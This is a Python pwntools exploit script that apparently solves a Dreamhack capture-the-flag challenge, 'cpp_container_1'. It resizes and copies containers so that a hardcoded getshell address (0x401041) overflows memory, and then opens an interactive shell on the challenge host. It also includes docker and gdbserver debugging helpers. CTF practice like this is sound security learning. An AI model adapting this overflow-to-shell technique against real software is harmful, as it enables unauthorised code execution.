#!/usr/bin/env python3
from pwn import *

exe = ELF("./cpp_container_1_patched")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

local_port = 5000
localscript = f'''
file {exe.path}
define rerun
    !docker exec -u root -i debug_container bash -c "kill -9 \\$(pidof gdbserver) &"
    !docker exec -u root -i debug_container bash -c "gdbserver :9090 --attach \\$(pidof chall) &"
end
define con
    target remote :9090
end
'''

gdbscript = '''
b *main
c
'''

info = lambda msg: log.info(msg)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sna = lambda p, msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sn = lambda p, data: p.sendline(str(data).encode())
s = lambda p, data: p.send(data)


def conn():
    if args.LOCAL:
        r = process ([exe.path])
        # r = remote ("localhost", local_port)
    elif args.GDB:
        r = gdb.debug ([exe.path], gdbscript=gdbscript, env={'SHELL': '/bin/bash'})
    elif args.REMOTE:
        r = remote("host3.dreamhack.games", 20405)

    return r

def debug_container(p):
    if args.LOCAL:
        gdbserver_cmd = "docker exec -u root -i debug_container bash -c".split()
        gdbserver_cmd.append("gdbserver :9090 --attach $(pidof prob)")
        process(gdbserver_cmd)
        
        # gdb.attach(('0.0.0.0', 9090), exe=exe.path, gdbscript=localscript)
        pause()

def make_container (p, a, b):
    sla (p, b'[*] select menu: ', b'1')
    p.recvuntil (b'container1 data')
    for i in a:
        sna (p, b'input: ', i)
    p.recvuntil (b'container2 data')
    for i in b:
        sna (p, b'input: ', i)

def modify_container (p, sz1, sz2):
    sla (p, b'[*] select menu: ', b'2')
    sna (p, b'container1 size', sz1)
    sna (p, b'container2 size', sz2)

def copy_container (p):
    sla (p, b'[*] select menu: ', b'3')

def view_container (p):
    sla (p, b'[*] select menu: ', b'4')

def main():
    p = conn()
    if args.LOCAL and args.GDB:
        debug_container (p)
    getshell = 0x401041
    a = [1, 2, 3]
    b = [4, 5, 6]
    make_container (p, a, b)
    modify_container (p, 9, 3)
    a = [1, 2, 3, 4, 5, 6, 7, 8, getshell]
    make_container (p, a, b)
    copy_container (p)



    p.interactive()


if __name__ == "__main__":
    main()